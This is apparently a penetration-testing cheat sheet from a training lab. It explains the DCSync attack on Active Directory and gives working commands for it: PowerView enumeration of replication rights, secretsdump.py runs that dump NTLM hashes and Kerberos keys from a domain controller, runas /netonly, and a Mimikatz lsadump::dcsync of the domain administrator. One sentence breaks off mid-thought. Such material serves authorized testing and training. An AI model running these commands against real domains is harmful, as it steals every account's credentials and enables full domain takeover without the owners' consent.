# DCSync 
DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

The crux of the attack is requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right. This is an extended access control right within AD, which allows for the replication of secret data.

To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.

## Using Get-DomainUser to View adunn's Group Membership
```
PS > Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

## Using Get-ObjectAcl to Check adunn's Replication Rights
```
PS > $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS > Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

## Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
```
$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
$ secretsdump.py -outputfile inlanefreight_hashes <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> 
```
We can use the -just-dc-ntlm flag if we only want NTLM hashes or specify -just-dc-user <USERNAME> to only extract data for a specific user. Other useful options include -pwd-last-set to see when each account's password was last changed and -history if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The -user-status is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:

If we check the files created using the -just-dc flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with reversible encryption enabled.

## Using runas.exe
```
> runas /netonly /user:INLANEFREIGHT\adunn powershell
```

### Performing the Attack with Mimikatz
```
PS > .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```